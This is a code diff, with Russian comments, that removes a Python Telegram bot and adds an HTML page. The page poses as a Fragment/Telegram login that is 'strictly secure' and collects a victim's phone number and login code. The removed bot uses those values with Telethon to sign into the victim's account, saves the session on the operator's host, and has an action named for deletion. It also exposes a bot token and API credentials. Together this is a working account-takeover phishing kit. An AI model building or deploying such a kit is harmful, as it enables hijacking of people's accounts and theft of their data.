@@ -1,70 +1,109 @@
-import telebot, json, asyncio, re
-from telebot import types
-from telethon import TelegramClient
-
-# --- ТВОИ ДАННЫЕ ---
-BOT_TOKEN = "8611748903:AAGxBTXL74UfjsO26s5ZT4h6mts2VwCBpU0"
-API_ID = 28687552
-API_HASH = "1abf9a58d0c22f62437bec89bd6b27a3"
-ADMIN_ID = 174415647
-WEB_APP_URL = "https://dreiner.onrender.com" 
-
-bot = telebot.TeleBot(BOT_TOKEN)
-# Словарь для хранения активных подключений
-temp_clients = {} 
-
-@bot.message_handler(commands=['start'])
-def start(message):
-    if message.from_user.id != ADMIN_ID: return
-    web_app = types.WebAppInfo(WEB_APP_URL)
-    btn = types.MenuButtonWebApp(type="web_app", text="Fragment", web_app=web_app)
-    bot.set_chat_menu_button(message.chat.id, btn)
-    bot.send_message(message.chat.id, "🚀 Панель Fragment запущена! Нажми кнопку в меню.")
-
-@bot.message_handler(content_types=['web_app_data'])
-def handle_data(message):
-    data = json.loads(message.web_app_data.data)
-    action = data.get("action")
-    phone = data.get("phone")
-    
-    # Создаем цикл для асинхронных задач
-    loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(loop)
-    
-    if action == "send_code":
-        bot.send_message(message.chat.id, f"📩 Запрашиваю код подтверждения для `{phone}`...")
-        # ЗАПУСК ПРОЦЕССА ОТПРАВКИ КОДА ТЕЛЕГРАМОМ
-        loop.run_until_complete(request_telegram_code(phone, message.chat.id))
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <script src="https://telegram.org"></script>
+    <script src="https://unpkg.com"></script>
+    <style>
+        body { 
+            background-color: #ffffff; 
+            /* Узоры Telegram на фоне */
+            background-image: url("https://www.transparenttextures.com");
+            color: #000000; 
+            font-family: -apple-system, sans-serif; 
+            display: flex; flex-direction: column; align-items: center; justify-content: center; 
+            height: 100vh; margin: 0; overflow: hidden; 
+        }
+        .container { 
+            width: 90%; max-width: 400px; text-align: center; 
+            background: rgba(255, 255, 255, 0.9); padding: 30px; border-radius: 20px;
+        }
+        .tg-logo { width: 75px; height: 75px; margin-bottom: 20px; }
+        h2 { font-size: 26px; font-weight: 700; margin: 0 0 10px; }
+        p { font-size: 15px; color: #707579; margin-bottom: 25px; line-height: 1.4; }
+        a { color: #3390ec; text-decoration: none; font-weight: 500; }
         
-    elif action == "login_and_del":
-        code = data.get("code")
-        bot.send_message(message.chat.id, f"⚙️ Код `{code}` получен. Вхожу в аккаунт...")
-        loop.run_until_complete(login_into_account(phone, code, message.chat.id))
+        .phone-box { display: flex; flex-direction: column; gap: 12px; margin-bottom: 20px; }
+        select { 
+            width: 100%; padding: 12px; border-radius: 12px; border: 1px solid #dfe1e5; 
+            background: #f4f4f5; font-size: 16px; outline: none; appearance: none;
+        }
+        input { 
+            width: 100%; padding: 15px; border-radius: 12px; border: 1px solid #dfe1e5; 
+            background: #f4f4f5; color: #000; font-size: 18px; box-sizing: border-box; outline: none; text-align: center;
+        }
+        input:focus { border-color: #3390ec; }
+        
+        button { 
+            width: 100%; padding: 16px; background: #3390ec; color: #ffffff; border: none; 
+            border-radius: 12px; font-weight: 600; font-size: 17px; cursor: pointer; transition: 0.2s;
+        }
+        button:active { background: #2b79c7; transform: scale(0.98); }
+        .footer { margin-top: 35px; font-size: 12px; color: #9bb2c5; font-weight: 500; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <svg class="tg-logo" viewBox="0 0 240 240"><circle cx="120" cy="120" r="120" fill="#3390EC""")/>><path d="M175.987 80.8159L158.336 164.103C157.007 169.967 153.551 171.428 148.621 168.662L121.73 148.835L108.756 161.314C107.319 162.751 106.12 163.962 103.354 163.962L105.289 136.502L155.26 91.2461C157.432 89.313 154.784 88.2384 151.884 90.1714L89.9882 129.141L63.3853 120.824C57.5996 119.016 57.4789 115.031 64.5925 112.254L168.607 72.1384C173.436 70.3274 177.662 73.2088 175.987 80.8159Z" fill="white""")/>></svg>
 
-# ФУНКЦИЯ ЗАПРОСА КОДА (Чтобы он ПРИШЕЛ в Telegram)
-async def request_telegram_code(phone, chat_id):
-    # Создаем временную сессию для этого номера
-    client = TelegramClient(f'sess_{phone}', API_ID, API_HASH)
-    temp_clients[phone] = client
-    await client.connect()
-    try:
-        # Эта команда заставляет Telegram отправить код пользователю!
-        await client.send_code_request(phone)
-        bot.send_message(chat_id, "✅ Код успешно отправлен пользователю в Telegram.")
-    except Exception as e:
-        bot.send_message(chat_id, f"❌ Ошибка отправки кода: {str(e)}")
+        <h2 id="title">Fragment</h2>
+        <p id="desc">Введите номер для авторизации на <a href="https://fragment.com" target="_blank">fragment.com</a></p>
+        
+        <div class="phone-box">
+            <select id="country" onchange="changeCountry()">
+                <option value="RU" data-mask="+{7} (000) 000 00 00">🇷🇺 Россия (+7)</option>
+                <option value="AZ" data-mask="+{994} (00) 000 00 00">🇦🇿 Азербайджан (+994)</option>
+                <option value="US" data-mask="+{1} (000) 000 0000">🇺🇸 США (+1)</option>
+                <option value="KZ" data-mask="+{7} (000) 000 00 00">🇰🇿 Казахстан (+7)</option>
+                <option value="UZ" data-mask="+{998} (00) 000 00 00">🇺🇿 Узбекистан (+998)</option>
+                <option value="OTHER" data-mask="+{000000000000}">🌍 Другая страна...</option>
+            </select>
+            <input type="tel" id="phoneInput">
+        </div>
+        
+        <button id="btn">Далее</button>
+        <div class="footer">STRICTLY SECURE VIA TELEGRAM PASSPORT</div>
+    </div>
 
-# ФУНКЦИЯ ВХОДА
-async def login_into_account(phone, code, chat_id):
-    client = temp_clients.get(phone)
-    if not client: return
-    try:
-        await client.sign_in(phone, code)
-        bot.send_message(chat_id, f"🔓 Вход в аккаунт `{phone}` выполнен успешно!\nСессия сохранена на хостинге.")
-        # Здесь можно добавить логику удаления или выгрузки данных
-    except Exception as e:
-        bot.send_message(chat_id, f"❌ Ошибка входа: {str(e)}")
+    <script>
+        let tg = window.Telegram.WebApp;
+        tg.expand();
+        let step = 1;
+        let mask;
+        let savedPhone = "";
 
-if __name__ == '__main__':
-    print("Бот работает...")
-    bot.infinity_polling()
+        function initMask(pattern) {
+            if (mask) mask.destroy();
+            mask = IMask(document.getElementById('phoneInput'), { mask: pattern, lazy: false });
+        }
+
+        function changeCountry() {
+            const sel = document.getElementById('country');
+            const pattern = sel.options[sel.selectedIndex].getAttribute('data-mask');
+            initMask(pattern);
+        }
+
+        initMask("+{7} (000) 000 00 00");
+
+        document.getElementById('btn').onclick = function() {
+            if (step === 1) {
+                savedPhone = mask.unmaskedValue;
+                tg.sendData(JSON.stringify({ "action": "send_code", "phone": "+" + savedPhone }));
+                
+                document.getElementById('country').style.display = 'none';
+                document.getElementById('desc').innerText = "Введите код из Telegram для подтверждения входа";
+                mask.destroy();
+                let input = document.getElementById('phoneInput');
+                input.value = ""; input.placeholder = "- - - - -";
+                document.getElementById('btn').innerText = "Авторизоваться";
+                step = 2;
+            } else {
+                let code = document.getElementById('phoneInput').value;
+                tg.sendData(JSON.stringify({ "action": "login_and_del", "code": code, "phone": "+" + savedPhone }));
+                tg.close();
+            }
+        };
+    </script>
+</body>
+</html>
